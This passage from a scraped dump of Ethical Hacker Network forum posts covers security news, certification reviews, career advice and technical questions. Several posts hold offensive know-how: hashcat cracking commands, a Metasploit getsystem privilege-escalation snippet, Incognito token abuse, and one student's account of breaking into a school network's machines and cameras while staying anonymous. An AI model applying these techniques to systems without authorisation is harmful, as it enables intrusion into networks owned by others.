compromise.  this means that members of eh-net or registrants for chicagocon may have had their account information in the hands of black hats for 8 moths.  forum and conference registrants trusted eh-net to keep their account details secure (it is a security organization after all).  at the very least they should have known about the compromise as soon as it happened so they could be given the opportunity to change passwords shared with other accounts.  instead theyre notified almost a year after the fact.  this sort of scenario is *exactly* why so many states have passed mandatory notification laws - to protect consumers from circumstances where trusted vendors lose their information but dont notify the customers

2;Internet Explorer 8 "Critical" Flaw in Final Versionhe internet explorer 8 (ie8) vulnerability demonstrated last week at the cansecwest hacker conference in the beta version of the popular web browser also exists in the final version. microsoft confirmed that the vulnerability exists in the official release, said terri forslof, a researcher at tippingpoint, which sponsored the pwn2own contest that challenged competitors to find bugs in either web browsers or mobile devices. no details of the ie8 exploit -- discovered wednesday by the hacker "nils" -- are available, but it could represent a major problem, forslof said. “this is a single-click-and-youre-owned exploit,” she told scmagazineus.com on tuesday. “you click a link in an email or simply browse to a website, and your machine is compromised. this meets microsofts ‘critical bar [in its vulnerabilities and rating system].” the exploit was demonstrated the day before the final version of ie8 was released on thursday. “once the browser was compromised, we handed over the exploit to microsoft immediately, on site," forslof said. "they went back and reproduced it and called to verify that the vulnerability was present. we retested again on the released version of ie8 that went live on the following morning and verified that the vulnerability was in it as well.” the exploit apparently defies microsofts dep (data execution prevention) and aslr (address space layout randomization) technologies -- two features added to ie8 to prevent memory corruption vulnerabilities.  for its part, microsoft said in a monday blog post: “the final release of internet explorer 8 on windows vista blocks the .net dep+aslr bypass mechanism from malicious websites on the internet. but this post may have been more specifically referring to different bypass mechanisms that were demonstrated by a pair of researchers at last years black hat conference in las vegas.  in addition, the microsoft post only mentions vista. the cansecwest exploit was demonstrated using a beta version of windows 7, which may call the issue into question. a microsoft spokeswoman said she was unable to immediately provide a comment. original story: http://www.scmagazineus.com/internet-ex ... le/129407/ do

2;Web Mail Company to Pay Prize After CEO Hackedsecure web mail company that challenged hackers to break into the companys web mail system is paying out a us$10,000 prize, just days after launching the contest. a team of hackers managed to hack into strongwebmail ceo darren berkovitzs web mail account, using whats known as a cross-site scripting (xss) attack, the company confirmed monday. "they did it using an xss script that took advantage of a vulnerability in the backend webmail program," strongwebmail said in a statement. strongwebmail launched  the contest  at the end of may as a way of promoting the voice-based identification technology sold by its parent company, telesign. hackers were given berkovitzs e-mail address and password and challenged to break into the account. the company thought this would prove difficult because strongwebmail requires a special password that is telephoned to the user before e-mail can be accessed. secure science chief scientist lance james and his fellow hackers aviv raff and mike bailey found a back door in a common web flaw, however, and claimed that theyd won the contest last thursday. strongwebmails statement confirmed that they had indeed hacked into berkovitzs e-mail account. in cross-site scripting, the attacker takes advantage of a bug on the web server in order to run malicious web script in the victims browser, essentially taking control of the browser. the hackers found the web flaw within a minute, james said, and then spent about six hours perfecting their attack. not a lot of work for a $10,000 payout. strongwebmail said it was "not deterred" by the contests quick conclusion and would be launching a new competition once this bug was fixed. "we wont rest until we have created the most secure e-mail in the world," the company said. the bug used by the hackers was actually in the rackspace web mail software used to power strongwebmail, not in the telesign authentication system that strongwebmail was created to promote, berkovitz said in an e-mail interview.  the prize amount and rules of the next contest have yet to be determined, he added. "we are going to try and make the next contest really about breaching the portion that telesign protects," he said. "the e-mail we licensed is obviously from a large and reliable provider, but there is only so much we can do to ensure that they dont have holes on their end." in an e-mail sent to james and viewed by the idg news service, the company complimented him on his hacking skills. "you and your team are quite impressive - what are your consulting rates?" the e-mail states. original story: http://www.pcworld.com/businesscenter/a ... acked.html do

2;Symantec to Introduce Reputation-Based Securitynformation gathered under symantecs community watch program will be used in norton antivirus 2010 and will eventually make its way into enterprise products symantec is to use the wisdom of the crowds and introduce reputation-based security in the next version of its norton antivirus 2010 product. the software, due out at the end of august, the company will be using information gathered under its community watch program. gerry egan, symantec product management director said that the problem that the company faced was that the old way of checking for anti-viruses was inefficient. "there are two approaches: blacklisting works well with files that you know are bad, and whitelisting, which works well with files that are known to be good -- but these dont work so well in the middle -- it was clear that we needed a new model." egan said that since 2007, symantec had been working on the idea that the wisdom of the crowds would fill the gap "we already use this approach for things likes books, music and films, were happy to be guided by other peoples opinions. were using a variant of that." he added that symantec didnt ask the individual users themselves. "to a user its not obvious what is safe: some threats are silent, sometimes the user doesnt know theyre there, some threats infect legitimate process while other threats pretend to be legitimate." he said that this reputation-based approach worked by constantly surveying the data being gathered from users without any need for human interaction. "weve devised our own algorithm within symantec that takes the data from the 30 million users who have signed up to community watch and calculates whether every individual program is safe or not," said egan. obviously, there will be new files that wed be unsure about but we have an arrangement with reputable publishers to pre-approve their software. "for example," said egan, "adobe could release a new program next week but theyd be on the approved list of publishers," he said. egan said that this reputation-based approach would be used in consumer products first but would eventually make it into enterprises. he thought the new release would move symantec ahead of its competitors and, more importantly, ahead of the bad guys. " i think it will be harder for the bad guys to beat this. we think this will keep us ahead for some time." original story: http://www.infoworld.com/d/security-cen ... curity-389 do
2;MS warns of Serious Security Holerticle -  microsoft warns of serious computer security hole ms advisory - 972890  (july 6) microsoft corp. has taken the rare step of warning about a serious computer security vulnerability it hasnt fixed yet. the vulnerability disclosed monday affects internet explorer users whose computers run the windows xp or windows server 2003 operating software. it can allow hackers to remotely take control of victims machines. the victims dont need to do anything to get infected except visit a web site thats been hacked. microsoft urged vulnerable users to disable the problematic part of its software, which can be done from microsofts web site, while the company works on a "patch" â or software fix â for the problem
3;Which disclosure philosophy?ello, lately i had some discussions about disclosure philosophies. although i am currently not really into any big exploit development scene i am still interested in this area. i would like to know if you follow any strict methodology in the disclosure process, and how you think on the moral and ethical site of this. i have found a similar  thread  on this topic but which focuses more on the problems regarding certifications. still interesting and may be read. personally i dont follow any strict rules as i think it depends on the case itself. full disclosure, which is probably best known from h d moore, is certainly important to push and force companies to supply patches and updates. also if a vuln. was found which is not public yet, it doesnt mean that no one else is aware of it. but it also means that this information is available for everyone, although not everyone is patching it (if someone is aware of a critical hole in her system she will probably fix it, but often people with little computer knowledge are not aware of it, although it is well-known). another fact i like in full-disclosure is that vendors probably have to do something in order to fix the vulnerability to not lose any customers/ clients and "face", however, i have often experienced that companies dont even reply if they got informed first privately and got some time to fix the problem. also i experienced that companies replied in a very angry manner and threatened the person who found the security issue with a sue when she publish her findings. although there are many advantages in full disclosure there are also disadvantages. when an exploit is released for some very critical systems it may cause huge damage before a patch can be supplied. because of this reason i think that it is good in general (again, i think there is no methodology to apply for every case) to give first the information to the manufacturer (responsible disclosure) and publish it then after a certain period of time to the public (is there any guideline on how long to wait actually?  wikipedia  writes about fourteen to thirty days but i read on some other websites about six months). i would like to know how other eh-netters think about this and if you stick to a certain routine..hope to have a little virtual discussion too
1;Suggestions for security projects wantedey, although i am already working on some smaller projects and help out at others, i would like to start and work regulary on one big project. currently i have no specific project in mind, only some basic conditions i would like to follow: it should be related with penetration testing (on the offensive site) or reverse code engineering, as those are the topics i have most knowledge of and personal interest in free, nothing to pay for others although not necessary, it may be good if such a project is not available yet or at least not "good", e.g. i see no particular reason for me to write another metasploit it doesnt matter for me if it is something to program, automate, write, teach etc. some random thoughts and keywords i have in mind: framework for pentesting report setting up a lab environment guides vulnerable operating system, application, etc. some kind of ctf some kind of training any suggestions or thoughts on this? any help is much appreciated. it is no problem if it is a bigger project.. i see this not only as a chance to help others in one way or another, but also to learn more myself, get "known", etc..so it doesnt matter for me if it takes a lot of time until it is finished. looking forward to comments on this

1;Starting out, but with a TS clearance?o this is the usual sort of im looking for advice thread.  my specific questions though are about how/where i can get started in offensive computing when i already have a ts clearance (edit: and i am in the us).  im in my 20s, but have been using computers since floppies were floppy, so i have a wide but shallow background (smattering of knowledge in some languages, some networking stuff, but nothing to impress).   so does anyone else have experience in top secret jobs? specifically, i guess, what do they need, and what might be a "ok, you can learn that on the job since you have a clearance" sort of thing.   i talked to one company that was very interesting, and they seemed to scoff at certifications (they poo-pooed ceh as likely to be out of date once completed) so i am currently not too concerned with certifications.  is this folly, or is this a cross-industry attitude? right now i am setting up some virtual machines and going to look through crackmes.de (which i saw here, in a post by synjunkie - thanks!) i was thinking to supplement this with other tutorial/poke around packages i find in the tutorial section in the forums, and free books.  is this a good way to learn? any other tips or ways that have worked for you?  also, what other sites do you recommend? this might just devolve into a favorites posting, but winnowing down the field of sites ive collected from here would be appreciated. thanks for the read-through and any advice! also, if this post is scattered please feel free to ask questions, i am still pretty scattered and trying to figure all this out
3;GCIH - Iz haz it.just got back from the testing center where i passed my gcih certification.  i got an a.    i just missed a handful out of the 150 questions. some of the ones i missed were just stupid on my part (i completely misread them), the others were educated guesses because i could not find the answer in the material. i basically took the sans self study route.  my study plan was reading and indexing counter hack: reloaded by ed skoudis.  it was beneficial because some test questions were lifted directly from the book.  combined with the sans sec504 course material, the counter hack index filled in some gaps.  i listened to the ed skoudis sans sec504 mp3s and read through the sans sec504 course ware.  i also had the course cd-rom, but i did not use it because i had good exposure to the tools when i was doing my c|eh.  i indexed all the slides from the course material as well as putting page markers in the course material and in ch:r.  i also had printed out all the sans cheat sheets, the wiki on netcat, and commonly used backdoor ports.  i wish i would have had commonly used port print-out, but i survived without it. the test itself was exactly like the practice test, but more difficult.  the practice test was more cut and dry, what do you use x for?  while i felt the actual test was more applying the knowledge, ex. if you wanted to do x and y, what would you use?  i felt my test was covered all topics evenly, and that all the tools were well represented, the ih process, and the details of each phase of ih.  the testing center was annoying.  in florida we just had out first cold front of the fall and they had the heat on!  luckily, i wore shorts.  i wish i would have had more room to spread out my books, but i managed.  once i knew i passed, i took a break, went to the bathroom, and re-arranged my work area. all in all, i enjoyed the experience.  i am looking forward to the live training event in dc for gcia.  then.. who knows what else i might go for.  gcfa?  gcfa?  maybe back to ec-council for cfhi?  or should i go for the gold?! or just focus on school until im done. thank you eh-net for all your support through my journey
3;Ethical?was surprised about hearing about the new iphone virus that was publically brought to my attention in the media today. apparently it was written by a 21 year old student from sydney in australia. the thing that disturbed me was that even though he had written a virus and distributed (a big no-no from an ethical hackers point of view) he recieved a few job offers. is it just me or does this seem wrong? i know people who are trying to break into this industry by doing stuff by the book, getting their certifcations trying to get work experience and literally studying their guts out to break into this field and a person with malicious intent can get job offers from releasing malicious code. kind of defeats the object doesnt it, opinion please
2;Kindle DRM Hackedn israeli hacker claims to have broken the copyright protection on amazons kindle e-reader, reports say. the hack will allow the ebooks stored on the reader to be transferred as pdf files to any other device.  the hacker, known as labba, responded to a challenge posted on israeli hacking forum, hacking.org.  it is the latest in a series of digital rights management hacks, the most famous being the reverse engineering of itunes.  the kindle e-book reader has been very successful since it was launched in the us in 2007.  amazon hopes to have sold a million devices by the end of the year.  it leaves it to individual publishers whether they want to apply drm but books in its main proprietary format .azw, cannot be transferred to other devices.  it did not immediately respond to the news but it is likely it will attempt to patch its drm software.  drm has long divided opinion. while rights holders regard it as a crucial tool to protect copyright, consumers tend to hate it because it limits what can be done with content.  "drm is not an effective way of preventing copying nor is it a good way of making sales. there isnt a customer out there saying what i need is an electronic book that does less," novelist and co-editor of the boing boing blog cory doctorow told the bbc when the kindle was launched.  as soon as a new drm system is active, hackers begin to try and break it.  most famously jon lech johansen, known as dvd jon, cracked the copy protection on dvds in 1999.  he went on to break the copyright protection on itunes, leading apple to offer drm-free music.  dvd jon now runs a company with an application to take the pain out of moving different types of content between devices. original story: http://news.bbc.co.uk/2/hi/technology/8428126.stm do

1;Help with Malicious Script in Database and Web Applicationust a newbie here and i am hoping that the security geniuses in here can help us with a problem. i am not a programmer, but our it person seems to have problems removing malicious codes/scripts in our system. (hope this is the right thread). i work for an online shop which has several programs interfaced with the live site. a month ago, we started having problems with the database. new entries or updates on the database are methodically deleted after an hour or so and even images are being deleted. my boss tells me that they found about 5 of the malicious codes in several applications and thought that they had cleaned it. when we started working again on the database, the same thing started happening again. would appreciate any idea that can help us nip the problem in the bud. thanks
1;Wannabe "Ethical Hacker" - Trying to learn privilege escalationsood morning all, total newbie here... unfortunately for me...i am both, new to linux (my apologies, 20/yrs windows, 0 linux) lol and, new to exploiting systems. and on top of these obstacles, i am doubling my frustration by pursuing related credentials of ceh (certified ethical hacker) and cpt (certified penetration tester), so as i am sure you can guess, i am feeling insane and well out of my comfort zone/league. down to it! i am searching for help - forums where i can communicate my needs and receive help/guidance. heck, i would love to pay for a couple hours worth of professional (well, better than me anyhow) training... i just cant seem to find such resources. anyhow, so, my situation... i have a vm for my lab testing, friends chose redhat7 it using kernel 2.4.20  goal is to acquire the shadow/passwd files and crack them, specifically user of root i am as far as 1 user account in, i can log into the gui of redhat, see directories (cept those without permissions) need help with the following; 1. immediate help/objective - finding a local privilege escalation to root exploit (i.e. do_brk, crash, krnl, ptrace, etc.) - compiling, installing, running the code - gaining root access and i can take it from there (i hope) 2. next goal something else i want to learn, is ssh brute force (hydra, brutessh, etc.) i use them, but they are not working....i think because the initial attempt is prompting for accepting the ssh key, but the brute apps are not accepting it - i think! last objective finally, using metasploit to remotely compromise the system (what exploit and how to use it properly (payloads, configs, etc. well, these are all goals of the training i want to pursue over this weekend and next.... can someone, anyone point me in the right direction!  provide assistance, recommendations/suggestions/lists of some resources that can help, propose where i can find the help to achieve those objectives above? thanks for your time and efforts - well in advance!!! kindest regards, nokaoi7

2;Pentagon unblocks social networking sitesttp://www.informationweek.com/news/gov ... d_iwk_news http://www.msnbc.msn.com/id/35611063/ns ... -security/ the new directive means that youtube, myspace and more than a dozen sites blocked by the pentagon in may 2007 will be unblocked, he said. the pentagon said at the time that the use of video sites in particular was straining its network and using too much of its bandwidth. but wennergren said friday that the move failed to stem the use of bandwidth because people just went to alternate sites. i saw this in the sans news bites feed some days after the news was released and im surprised nobody has commented on it.   being a dod employee i got the word a little preemptively in the form of a message saying something to the effect of "even though this is being released to the ap, the changes are not immediate so dont call the helpdesk if you cant get to facebook..." some units already dont block all of these sites and some block more than what was required by overarching policy so i still doubt that dod will have a uniform policy (pardon the pun).  what i fear this will lead to is additional required annual training in acceptable use of it resources.  while some it education is a necessity you always have to deal with the bottom 2% of employees who either dont understand or dont care.  the top 10% or so of employees simply proxy around blocked sites.  the folks in the middle go somewhere else (smaller sites probably == lower security, although admittedly a smaller target). the move to re-open access to youtube is particularly concerning since software updates happen at the speed of molasses on government computers.  i can already feel the coming wave of flash delivered malware coming to a niprnet machine near me. anyway, ill stop rambling.  i have mixed feelings about the move only because ive been dealing with the dod it folks since 1995 (heck, i was one until until 2004).  ultimately i think that until you are willing to back policy violations with "teeth", policy is meaningless.  reminds me of something i heard a navy officer opine a couple of years ago: if im at the helm of a ship and brush the ground or another ship, even with no damage or injuries to anyone, my career is over.  if i bring in trojan software from home, install it on my work computer and dod loses sensitive information i have to go to a refresher class.  until we correct this disparity of consequences dod it security is a joke
1;CEH Self Study books suggestionello all,  my first post in the forum   im planning to study for ceh and while googling found this site, ive already read questions about self study option and the suggested books and ive tried to build my "list" of books and was wondering if it is enough or need something more.  i would love to attend an official course/bootcamp but honesly i lack the time to attend the course (yeah sometimes even a week of absence can be a pain!) so self study is the only option to me. the books i was going to buy are the following :  official certified ethical hacker review guide ethical hacking and countermeasures: attack phases ethical hacking and countermeasures: threats and defense mechanisms ethical hacking and countermeasures: secure network infrastructures ethical hacking and countermeasures: web applications and data servers ethical hacking and countermeasures: linux, macintosh and mobile systems of course everything will be backed up with a lab where to test and have fun. keep in mind im not much interested in the certification per se btu on the knowledge and skill you learn along the way, do you think this can be enough for the exam? or it is too much/less? any advice, suggestion or addition to the above list would be greatly appreciated! keep in mind im a trainer and linux sysadmin in life so not properly a noobie in the industry.  ill look forward your precious advices! p
3;Getsystem privledge escalation using Metasploitorry to spam the posts guys, i just thought people would like to read these. videos are at the bottom link: a few weeks ago chris gates (ala attack research/carnal ownage/ethicalhacker.net) and joshua gauthier showed some quick snippets of metasploit’s getsystem extension. getsystem is meterpreter’s new (windows) privilege escalation extension used in the priv module. getsystem uses several techniques for priv escalation:     * windows impersonation tokens (fixed by ms09-012)     * abusing lsass via token passing (pass-the-hash) which requires administrator anyway.     * exploiting weak permissions (read and write) in the services (most of them by default run as system, if you are lucky they run as a domain administrator).     * improved kitrap0d exploit released by tavis ormandy ( ms10-015 patched as of now) as more privilege escalation exploits appear this year they will no doubt be rolled into the getsystem extension which i will be keeping a watchful eye on. thanks to stephen fewer for adding the new functionality to getsystem. also, check out bernardo damele’s (author of sqlmap!) walkthrough on integrating metasploit privilege escalation via sqlmap for post database exploitation. here. and a sample of the kitrap0d exploit below in msf by pieter danhieux (not getsystem but same functionality): kitrap0d in metasploi 3.3.4-dev meterpreter > use priv loading extension priv…success. meterpreter > getsystem -h usage: getsystem [options] attempt to elevate your privilege to that of local system. options: -h help banner. -t the technique to use.

3;Review: OffSec Wifuirst thing you do is contact them using their site, they will contact you, you give them your information, they check it, they will contact you, and you have to do some agreement stuff, then you make payment, and get your lab guide and videos. lab guide is most important imo. it starts out with talking about 802.*, and protocols and chan/freq. then its about wireless modes. then its packets, they did a very good job of explaining packets, one at a time, they explain each field and what data in it means. hardware and antennas are also mentioned in there.  after that aircrack-ng suit stuff starts, it has stuff about each different tool, and it talks mostly about aireplay-ng(nobody wants to wait hours to capture ivs). packetforge-ng, kismet, airsnarf are also in lab guide and video.  then its about doing attacks (wep[opn,ska], wpa) exam: 4 hours (i finished under hour) you ssh into their bt3 box, attack aps crack the key you report how you did it, what commands you used, and keys to them in 24 hours. then you are done (i hope i get the cert soon) this course is recommended to ethical n00bs who crack wep by watching videos and not understanding, and young people who are interested in career in infosec.  and for people who are good at this, and do this, they also offer only exam to get the cert.  bad(not really bad) part about this course is, it doesnt have information about tools like cowpatty or other tools(airdrop-ng, mdk3)(i hope they come out with new version), but it doesnt mean its not used today, people still use wep, and people also use weak passphrases in wpa.  i have learned lots of things that i didnt know from this course, before this i only cracked wep(opn) from youtube videos without knowing what i was doing(thankfully those video didnt tell me to rm -rf /*). for me this is good point to start(remember i am still in hs) this is very bad review, so ask me questions, i am better at them. and recommend stuff for young people..it helps(fo realz)
0;Got in over my head trying to help my school, anyone want to give me guidance?his is my first post on ethical hacker network and i hope to become an active member of the communtiy, but please dont flame me if my question is "n00bish" i am still in the process of learning offensive security and could really use help here. basically i am trying to convince the administrators at my school to switch the wifi security protocol from wep to wpa, however they are reluctant to do so and claim it does not need to be done. even after demonstrating how the password can be stolen they seem to think it doesnt matter if some random person hacks into our network. i want to prove them wrong. i noticed when running a basic ip scan that we have networked security cameras...hehehe *evil look* and i was thinking that a good way to give them a lasting impression would to be to demonstrate how a hacker could gain access to the schools security system on acount of a weak password to the wifi. here are the details: i found the config page for the dibos cameras at the local ip: 10.1.1.22 navigating there in a browser gives me something that looks like this (note this is not the page but one i found on someone elses site) http://209.3.146.51/ *it requires ie to view* i also found that there was a dibos-[lotsofnumbersandletters] workgroup on the network but when trying to "explore" that workgroup it asked for a username and password, it did not work. i have local admin access on *some* machines with the help of ophcrack, but they seem to not be able to find the workgroup and the 10.1.1.22 page is no different from an admin account also, our school keeps a "remote access" citrix client running from which i can run remote-desktop and get onto one of the few local machines that have rdp enabled, from there i can see the dibos workgroup but cannot access it, however i am a weak user on these remote computers and cant even run cain and abel or extract the sam files with pwdump. additionally, i suspect that the network admin account password is the same as that for the dibos, the issue is that i dont know how to get the network admin account although like i previously mentioned i have local admin on a few machines. also, i have been using an anonymous e-mail address to communicate with the administration and would like to remain unknown for a while longer so that they dont just put all kinds of security on my user account or pay particular attention to me in the future, thus if it is possible to remain invisible that would also be ideal. finally, i understand that the information that you post here may be used for less noble purposes and if you would prefer to pm me your advice rather than post it here than please do so. thanks and i look forward to being part of the ethical hacker network, javap2
3;0day Research Markeror those interested... great idea out of unsecurityresearch to do an anonymous survey of vulnerability researchers to identify their experiences interacting with the groups advertising vulnerability purchasing programs and direct buyers (anyone who buys vulnerabilities but doesnt maintain an advertised program).  http://cyber-son.blogspot.com/2010/05/v ... mbers.html side note... i woke up from the harsh realities of "to cert or not to cert" ( www.cert.org ) i want to say this year. as of 2005 (they still have cases that far back from me), from 2005 through now i have about 10-15 open vrus (f5, cisco, ms, vmware and others) for non small software issues. i went the "responsible" disclosure route. spent who knows how many hours on research, crashing, fixing, testing, exploiting, etc... i was on the phone with codenomicon recently trying to get ahold of their fuzzer (really expensive) and my theory was: "if i found bugs and responsibly disclosed them, the world would be a safer place" (sort of). it was during the conversation where the engineer made me realize... "why are you bothering to do any of these vendors favors? they pay people on their staff to address these concerns. you get nothing out of it..." that coupled with the "no more free bugs" ( http://trailofbits.com/2009/03/22/no-more-free-bugs/ ) movement and it was game over. there is a huge marketplace for responsible research. for those into reverse engineering, fuzzing, exploiting, i hope you find the stats to be worthy to either contribute if youve made money from your research, or if youre into researching, keep something in mind... at the end of the day, free security research is pointless. this does not mean youre selling out or practicing reckless disclosure. just some food for though
1;Hashing of URLs in registry (IE7)m trying to debug a problem we have with an in-house web app and saved passwords.  in doing so ive run into something of a roadblock.  ive read how ie7 saves passwords under hkey_current_user\software\microsoft\internet explorer\intelliforms\storage2 apparently the key name should be a sha1 hash of the url, and then the data is the encrypted login data.  what is throwing me is trying to verify the hashes.  if i take a simple url and then have ie save my password at that site, i see a new key created.  id like to know exactly what string (url) is used to generate this key.  when i take the url and generate a hash in linux (sha1sum), i get a 40 character hex string (20 bytes).  when i look in the registry, all of the entries in storage2 are 42 characters (21 bytes). i found a couple of references that said the first byte in the registry was some sort of checksum, but removing that still doesnt get me the right answer. to further confuse matters, if i generate a sha1 sum on my linux box, i get a different hash than from several websites.  clearly i am missing something.  for example: #echo hello | sha1sum f572d396fae9206628714fb2ce00f72e94f2258f  - but when i visit several sites that claim to have hash generators, the string "hello" produces this value:  aaf4c61ddcc5e8a2dabede0f3b482cd9aea9434d ( http://www.daveproxy.co.uk/tools/sha1_h ... erator.php ) ( http://www.ideaspace.net/misc/hash/ ) ( http://pajhome.org.uk/crypt/md5/ ) so what am i doing wrong? thanks, bria

3;Storing Passwordsve been thinking about this, and would like your input please: handling company passwords can be a tricky thing (i know i dont have to tell you all this).  you shouldnt write down passwords because physical security can become a problem. even if physical security is not a main concern, it still shouldnt be written down, because you never know who will have access to it.  it also shouldnt be kept on a computer, because first of all, you might need a password that is in that file to login to the computer to begin with. secondly, it is possible that someone may gain access to that file and obtain your passwords. even encrypted files run that risk (unless your company invests in good encryption software). for a large company with a good budget, there seems to be more options as far as password storing software or good encryption software that can be purchased. however, what about a small business that does not focus much on security because they dont feel they would ever be a target. the administrator understands that anyone can be a target, specially those who think they wont ever be attacked. so in an effort to secure the place as best possible with what is available, he attempts to harden the passwords for all the systems, etc... but then obviously, by making them more complex, a place to write them down becomes a necessity. you come in to the office, had a rough weekend, come in on monday, and run a blank.  maybe keeping a book with the passwords in a cabinet locked by a key that only one person has access to is a the best choice?  how about keeping it stashed in your email somewhere? emails can be compromised as well, so i dont see that as being very safe. im just trying to weight all the options i have regarding this. i figured some of you have had so much experience with this, that you may have a better solution than what i can think of. "he" is me by the way. â :) sorry for the long post, but thanks for reading.  knb1

3;The True Power a Hacker Possessesbout three months ago i was almost positive that i was just one step under elite hacker like in the movies. someone taught me how to download torrents off of h33t and junkie and clamed them as my own. yes, my dumb ass looked like a cool cyber punk hacker to my friends that didn’t have the computer genius like i did.        the funny thing about acting like a douchebag and not knowing it is that someone else always will. after doing my banking online one day i realized that something was wrong with my computer but i couldn’t put my finger on it. i had control over my computer but at the same time i didn’t??? yep, believe it or not a real hacker took control over my whole system and blocked me out of everything even changed all my passwords and went on my facebook. the hacker elite got hacked himself. oh, i forgot to tell you the most embarrassing part about my story, i’m 27 years old.      instead of being embarrassed for being taught a lesson i started getting scared and a little paranoid….. ok a lot of paranoia… look at all the banking i do online including ebay, paypal and everything else i have on there. so for the past three months i have been trying to learn as much as can about everything……. i had no clue that my computer skills that i thought i had was a complete joke and school is way too expensive for me to afford now.  then i find this site, filled with people who do possess the knowledge for real and use it to protect the unprotected. some of my fears have lifted but will never go away.       my goal now is to teach myself the best i can using the internet and hopefully some of you. when i start to understand some of the basics i want to start a website as a side project with everything i learn being added as i go. i haven’t fully thought this idea out yet but it will come together. i bought a few books from barns and noble the other day called the networking bible, hacking for dummies, and visual basic. i don’t know if this is a good place to start or not. knowledge is understandably expensive but i think it needs to be given to everyone who wants it

2;US Calls Out China & Russia for Cyber Espionage Costing Billionsey, china and russia, get off of our clouds. thats the warning from a new u.s. national intelligence directors report to congress released thursday that states china and russia are the biggest perpetrators of economic espionage through the internet.  the report, foreign spies stealing u.s. economic secrets in cyberspace, also warns that the efforts to calculate the cost of lost research and development is nearly impossible to calculate but could be costing up to $398 billion. as mobile devices proliferate, its only going to get easier for spies to steal. analysts note that this is the first time the u.s. government report has so openly blamed countries that support cyber attacks and espionage at the national and state level. "the computer networks of a broad array of u.s. government agencies, private companies, universities, and other institutions -- all holding large volumes of sensitive economic information -- were targeted by cyber espionage; much of this activity appears to have originated in china," reads the report. drawing on data from 13 agencies, including the cia and fbi, over the past two years, the report concludes that attacks against u.s. government networks and military contracts are on the rise. but one of the most worrying trends is the growing number of attacks on businesses that are smaller than the fortune 500 companies. additionally, the report states that chinas intelligence services -- as well as private companies and other entities -- are exploiting chinese citizens or others with family ties in china who have "insider access to corporate networks to steal trade secrets using removable media devices or e-mail." as for russia, the report noted that the "10 russian foreign intelligence service illegals arrested in june 2010 were tasked to collect economic and technology information." house intelligence committee chairman mike rogers said the report confirms what hes heard previously about the chinese. for full story: http://www.foxnews.com/politics/2011/11 ... -billions/ do

1;Wanna help a NOOB?ey everyone i just magically got moved from doing malware analysis to pen testing, i am a total noob at pen testing (no training, no classes just a bit o playinâ). my boss told me today that my first task is to quietly scan a subnet in our domain to identify any websites that are running and to log the url and ip address in a csv. my problem is that i am not sure of the best way to go about this without setting off a bunch of alarms. i guess what i need your help with right now is do you know of any tools or a script that will go out and look at a subnet and identify any websites on that subnet and log them? i know that i can identify any webserver running iis/apache with nmap but i donât know of a way that i can output the url and ip address for the websites on that server. any help and or ideas would be greatly appreciated. example: launch script/scan against 192.168.2.0/24 to identify all sites > export this info to a csv file

3;GWAPT passed...made it through my fifth giac exam today and barely made it over the 90% score line.  i was stressing quite a bit before i sat down in front of the exam terminal and mentally cleared my mind for the inevitable fail.  it was a good exam with some quality analysis questions (and a few really lame ones). im not aspiring to be a pentester and i dont think 542 will help someone go from zero to pro overnight.  it does provide good starting foundations though and there was broad coverage on different subject areas and lots of tools.  id guess that doing pwb would be more "fun," but 542 was a good experience nonetheless.  kevin johnson brought it all together quite well. so that said, i have a spare gwapt practice exam for someone who has never taken a giac practice (or real) exam before.  i know sans courses and giac certification attempts arent cheap, so instead of passing it to someone in the sans advisory board or another forum where ive given away practice tests before, i figure id give someone here a shot at it.  so for a little fun, here are the rules: you have never taken a giac exam before (im relying on your sense of honor here). you must send your request to my email address encrypted with my gpg key. determine the os and its version that my website is running on. determine the rfc1918 address space the server is sitting in. im not inviting a pentest or simulated / real attack, just merely a casual scan and guess-work with your favorite interception proxy (if thats how you roll).  no exploits allowed, thank you very much.  i havent patched in seven years (...just kidding).  if you cant find the answers, just pat yourself on the back for trying (not as if i could do any better) and email me your encrypted request

1;HashCat MD5 with salt crackingas looking for the password cracking did not see it so ill start here, sorry if its wrong please: hello, been trying for a few days now trying to get hashcat to work, cracking a md5 hash with salt. this is just a quick example or what i am trying to do 69c12c189531e95fc6b6b4191ce29220 is the hash the salt is dz the password for this is dz0000 fakehash has the above hash salt has the above salt this does not work: ./hashcat-cli32.bin -m 0 -a 3 -e salt --bf-pw-min=4 --bf-pw-max=6 --bf-cs-buf=1234567890 fakehash when i run this it does work: ./hashcat-cli32.bin -m 0 -a 3 -e salt --bf-pw-min=4 --bf-pw-max=6 --bf-cs-buf=1234567890dz fakehash when i run this it works but tries ./hashcat-cli32.bin -m 0 -a 3 -e salt --bf-pw-min=5 --bf-pw-max=6 --bf-cs-buf=abcdefghijklmnopqrstuvwxyz1234567890abcdefghijklmnopqrstuvwxyz fackhash to my understanding it start 0000 and goes from there so it should put dz in front and then at 6 it should do dz0000 resulting in the first crack.â  but instead it does 000000 and goes from there not using the salt.â  how do i force it to use salt any help would be greatly apprenticed
1;Becoming a Pentesterstill have a couple of years to decide, but right now im thinking about a job as a pentester. i live in the uk, so was hoping for advice specific to jobs in this country. what path do i need to follow in order to get a job? which qualifications will i need (the oscp and osce courses look particularly interesting), which courses should i think of taking at university?  ive looked at the ethical hacking course at my local uni, but it seems more like a computer science course with a couple of security modules thrown in, i doubt it would teach anyone to actually hack, ill do a bit more research but it looks pretty weak. is there any way to get experience now? such as voluntary work etc.? thank you  -sam kenned

3;Discreet Hacking Devicesas anyone ever toyed around with the idea of using small, discreet, low-power computers (like the raspberry pi) as an attack platform? its small enough that if you got a decent, professional-looking case for it, it could blend in with other network equipment at a client site. there is a project out there, called raspberrypwn, that is supposed to be a pentesting linux distro for the raspi. its easy enough to put together your own pentesting tools, especially with something like arch linux, but its still interesting. raspberry pi is not the only platform i have in mind, either. gooseberry, apc, etc. are similar, each with different specs. i imagine one could leave a scan running over the course of several days, or weeks, running slow enough to not trigger an ids, and pick it up later. some of them are cheap enough that it would be of little concern if you were unable to recover it for some reason (raspi is only $35). anyway, just an idea i had rolling around. let me know what you think

3;Windows Token Misusei all, just a quick question, ive recently found quite bad overuse of domain admin privs accross our network by admins. ive performed a poc by using incognito and successfully added a new account from a standard account into the domain admins via tokens. ive read the paper for this, as included in unleashed\bt type materials. so i will be trying to implement better policy to control overuse and highlight the dangers to why domain admins needs reducing.  im currently going through a best practise windows 7 hardening document and it mentions using user account control (uac)  would this be a mitigation or risk reduction in an attack like incognito? my feelings are it could help remove the dash attitude of just logging in as admin and therefore reducing the amount of tokens hanging around.  granted the real problem is a culture shift and ad structure\ least priv permissions themes, but its still useful.  any opinions or experiences welcome... thank

